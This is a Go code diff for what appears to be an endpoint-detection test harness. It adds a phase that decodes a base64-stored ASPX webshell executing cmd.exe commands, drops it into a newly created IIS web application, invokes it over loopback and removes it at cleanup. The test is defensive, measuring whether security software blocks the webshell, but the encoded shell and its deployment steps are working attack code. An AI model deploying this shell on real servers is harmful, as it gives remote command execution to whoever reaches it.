@@ -21,6 +21,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"fmt"
 	"io"
 	"net/http"
@@ -50,6 +51,12 @@ var isAdminContext = false
 // probeAdminContext checks whether the current context is elevated.
 func probeAdminContext() bool {
 	return exec.Command("net", "session").Run() == nil
+}
+
+// fileExists is a small os.Stat wrapper
+func fileExists(path string) bool {
+	_, err := os.Stat(path)
+	return err == nil
 }
 
 // isPositiveProtectionEvidence returns true ONLY for exact OS/policy denial
@@ -109,6 +116,39 @@ var reconCommands = []ReconCommand{
 		Args:        []string{},
 		Description: "Running processes - identify security software and interesting processes",
 	},
+}
+
+// webshellAspxB64 is a minimal textbook ASPX command-execution webshell,
+// base64-stored so the repo never carries a directly-usable webshell file
+// (decoded and written to the lab webroot only at runtime, deleted at cleanup).
+// Bit source: textbook Process.Start(cmd /c ?c=) executor — the exact shape
+// webshell detections key on (aspx drop + w3wp.exe spawning cmd.exe).
+const webshellAspxB64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPgo8JQogICAgc3RyaW5nIGMgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJjIl07CiAgICBpZiAoIXN0cmluZy5Jc051bGxPckVtcHR5KGMpKSB7CiAgICAgICAgdmFyIHAgPSBuZXcgUHJvY2Vzc1N0YXJ0SW5mbygiY21kLmV4ZSIsICIvYyAiICsgYyk7CiAgICAgICAgcC5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTsgcC5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKICAgICAgICB2YXIgcHJvYyA9IFByb2Nlc3MuU3RhcnQocCk7CiAgICAgICAgUmVzcG9uc2UuV3JpdGUoIjxwcmU+IiArIHByb2MuU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCkgKyAiPC9wcmU+Iik7CiAgICB9CiU+Cg==" 
+
+// WEBROOT under ARTIFACT_DIR (non-whitelisted; all writes stay inside it)
+const WEBROOT_DIR = "c:\\Users\\fortika-test\\webroot"
+const WEBAPP_NAME = "F0"
+
+// webAppCreated tracks IIS app creation for cleanup
+var webAppCreated bool
+
+// runPowerShell runs a PowerShell command with MultiWriter capture; returns output+err
+func runPowerShell(psCmd string) (string, error) {
+	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
+	var buf bytes.Buffer
+	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
+	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
+	err := cmd.Run()
+	pid := 0
+	if cmd.Process != nil {
+		pid = cmd.Process.Pid
+	}
+	exitCode := 0
+	if err != nil && cmd.ProcessState != nil {
+		exitCode = cmd.ProcessState.ExitCode()
+	}
+	LogProcessExecution("powershell.exe", "powershell -Command <webapp mgmt>", pid, err == nil, exitCode, "IIS web-app management")
+	return buf.String(), err
 }
 
 // CommandResult stores the result of a reconnaissance command
@@ -237,6 +277,90 @@ func performC2Callback(data string) (bool, bool, string) {
 	return false, false, fmt.Sprintf("HTTP %d", resp.StatusCode)
 }
 
+// executeWebshellPhase drops a runtime-generated ASPX webshell into an IIS web
+// application rooted at WEBROOT_DIR (inside ARTIFACT_DIR — no writes outside
+// it) and invokes it over LOOPBACK, producing the defining webshell lineage:
+// w3wp.exe spawning cmd.exe. The ASPX payload is decoded from base64 at
+// runtime and deleted at cleanup; the repo never carries a usable webshell.
+// Returns: success, blocked, msg
+func executeWebshellPhase() (bool, bool, string) {
+	Endpoint.Say("  Webshell phase: IIS drop + loopback invocation (w3wp.exe lineage)")
+
+	// Prerequisite: W3SVC running
+	out, err := runPowerShell("(Get-Service W3SVC).Status")
+	if err != nil || !strings.Contains(out, "Running") {
+		LogMessage("WARN", "Webshell", "IIS (W3SVC) not running — skipping webshell phase (prerequisite)")
+		return false, false, "IIS not available — skipped"
+	}
+
+	// Create webroot + web application rooted in ARTIFACT_DIR
+	if err := os.MkdirAll(WEBROOT_DIR, 0755); err != nil {
+		return false, false, fmt.Sprintf("webroot mkdir failed: %v", err)
+	}
+	if _, err := runPowerShell(fmt.Sprintf(
+		"Import-Module WebAdministration; New-WebApplication -Name '%s' -Site 'Default Web Site' -PhysicalPath '%s' -Force", WEBAPP_NAME, WEBROOT_DIR)); err != nil {
+		LogMessage("WARN", "Webshell", fmt.Sprintf("New-WebApplication failed (benign skip): %v", err))
+		return false, false, fmt.Sprintf("web app creation failed: %v", err)
+	}
+	webAppCreated = true
+	LogMessage("INFO", "Webshell", fmt.Sprintf("Created IIS web application /%s -> %s", WEBAPP_NAME, WEBROOT_DIR))
+
+	// Drop the runtime-decoded ASPX webshell
+	aspx, err := base64.StdEncoding.DecodeString(webshellAspxB64)
+	if err != nil || len(aspx) < 50 {
+		return false, false, "webshell decode failed (internal)"
+	}
+	shellName := fmt.Sprintf("svc-%d.aspx", time.Now().Unix())
+	shellPath := filepath.Join(WEBROOT_DIR, shellName)
+	if err := os.WriteFile(shellPath, aspx, 0644); err != nil {
+		if strings.Contains(err.Error(), "Access is denied") {
+			return false, true, "webshell write denied (OS denial)"
+		}
+		return false, false, fmt.Sprintf("webshell write failed: %v", err)
+	}
+	LogFileDropped(shellName, shellPath, int64(len(aspx)), false)
+	LogMessage("INFO", "Webshell", fmt.Sprintf("Dropped runtime-generated ASPX webshell: %s (%d bytes)", shellPath, len(aspx)))
+
+	// Quarantine check: EDRs often delete dropped webshells
+	Endpoint.Wait(3)
+	if !fileExists(shellPath) {
+		LogFileDropped(shellName, shellPath, int64(len(aspx)), true)
+		LogMessage("INFO", "Webshell", "Webshell file disappeared (os.Stat-confirmed quarantine)")
+		return false, true, "webshell quarantined on drop"
+	}
+
+	// Invoke over LOOPBACK — this is the lineage signal: w3wp.exe -> cmd.exe
+	url := fmt.Sprintf("http://localhost/%s/%s?c=whoami", WEBAPP_NAME, shellName)
+	client := &http.Client{Timeout: 30 * time.Second}
+	startTime := time.Now()
+	resp, err := client.Get(url)
+	duration := time.Since(startTime)
+	if err != nil {
+		// Web-server errors are environmental, not endpoint protection (Rule 8)
+		LogMessage("WARN", "Webshell", fmt.Sprintf("Loopback invocation failed (benign): %v (%v)", err, duration))
+		return false, false, fmt.Sprintf("invocation failed: %v", err)
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	bodyStr := string(body)
+
+	if resp.StatusCode == 403 || resp.StatusCode == 404 {
+		// Remote-service response (IIS request filtering), not endpoint protection
+		LogMessage("WARN", "Webshell", fmt.Sprintf("IIS returned HTTP %d for the webshell (server-side filtering; logged, not counted)", resp.StatusCode))
+		return false, false, fmt.Sprintf("IIS HTTP %d", resp.StatusCode)
+	}
+
+	// Success = the webshell executed whoami under w3wp.exe (output looks like
+	// "computer\user" wrapped in <pre>)
+	if strings.Contains(bodyStr, "<pre>") && strings.Contains(bodyStr, `\`) {
+		LogMessage("INFO", "Webshell", fmt.Sprintf("Webshell executed under w3wp.exe lineage (HTTP %d, %d bytes, %v)", resp.StatusCode, len(body), duration))
+		return true, false, "webshell executed via IIS (w3wp.exe -> cmd.exe)"
+	}
+
+	LogMessage("WARN", "Webshell", fmt.Sprintf("Webshell responded HTTP %d but output not recognized (%d bytes)", resp.StatusCode, len(body)))
+	return false, false, "webshell response unrecognized"
+}
+
 // writeReconOutput saves all reconnaissance output to a marker file
 func writeReconOutput(results []CommandResult) error {
 	outputPath := filepath.Join(TARGET_DIR, "webshell_recon_output.txt")
@@ -296,6 +420,15 @@ func cleanup() {
 			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", file))
 		}
 	}
+
+	// Remove the IIS web application, any dropped webshells, and the webroot
+	if webAppCreated {
+		runPowerShell(fmt.Sprintf("Import-Module WebAdministration; Remove-WebApplication -Name '%s' -Site 'Default Web Site'", WEBAPP_NAME))
+		webAppCreated = false
+		LogMessage("INFO", "Cleanup", "Removed IIS web application /"+WEBAPP_NAME)
+	}
+	os.RemoveAll(WEBROOT_DIR)
+	LogMessage("INFO", "Cleanup", "Removed webroot "+WEBROOT_DIR)
 }
 
 func test() {
@@ -379,8 +512,26 @@ func test() {
 		LogPhaseEnd(1, "partial", fmt.Sprintf("%d/%d commands succeeded", successCount, len(reconCommands)))
 	}
 
+	// Phase 2b: Webshell Execution via IIS (w3wp.exe lineage)
+	LogPhaseStart(3, "Webshell Execution via IIS")
+	Endpoint.Say("\nPhase 2b: Webshell drop + loopback invocation (IIS)")
+
+	wsSuccess, wsBlocked, wsMsg := executeWebshellPhase()
+	if wsBlocked {
+		Endpoint.Say("  [BLOCKED] Webshell phase blocked (positive evidence)")
+		blockedCount++
+		LogPhaseEnd(2, "blocked", wsMsg)
+	} else if wsSuccess {
+		Endpoint.Say("  [VULNERABLE] Webshell executed via IIS (w3wp.exe -> cmd.exe lineage)")
+		successCount++
+		LogPhaseEnd(2, "success", wsMsg)
+	} else {
+		Endpoint.Say("  [INFO] Webshell phase skipped/inconclusive: %s", wsMsg)
+		LogPhaseEnd(2, "skipped", wsMsg)
+	}
+
 	// Phase 3: C2 Callback Simulation
-	LogPhaseStart(3, "C2 Callback Simulation")
+	LogPhaseStart(4, "C2 Callback Simulation")
 	Endpoint.Say("\nPhase 3: Simulating C2 callback (webshell beacon)")
 	Endpoint.Say("  Target: %s (harmless test endpoint)", C2_ENDPOINT)
 
@@ -396,14 +547,14 @@ func test() {
 
 	if c2Blocked {
 		Endpoint.Say("  [BLOCKED] C2 callback was blocked by network security")
-		LogPhaseEnd(2, "blocked", "C2 callback blocked by network security")
+		LogPhaseEnd(3, "blocked", "C2 callback blocked by network security")
 	} else if c2Success {
 		Endpoint.Say("  [VULNERABLE] C2 callback completed successfully")
-		LogPhaseEnd(2, "success", "C2 callback succeeded - outbound connection allowed")
+		LogPhaseEnd(3, "success", "C2 callback succeeded - outbound connection allowed")
 	} else {
 		// Network unavailable - not necessarily protected, could be environmental
 		Endpoint.Say("  [ERROR] C2 callback failed: %s", c2Error)
-		LogPhaseEnd(2, "failed", fmt.Sprintf("C2 callback failed: %s", c2Error))
+		LogPhaseEnd(3, "failed", fmt.Sprintf("C2 callback failed: %s", c2Error))
 	}
 
 	// Phase 4: Write Output and Assessment
@@ -542,7 +693,7 @@ func main() {
 		Severity:      "high",
 		Techniques:    []string{"T1190", "T1059.003"},
 		Tactics:       []string{"initial-access", "execution"},
-		Score:         6.9, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
+		Score:         7.7, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
 		RubricVersion: "v2.1",
 		// ScoreBreakdown intentionally nil under v2.1 — the v1 dimensions in
 		// the struct do not match the v2.1 tiered structure. The v2.1 breakdown
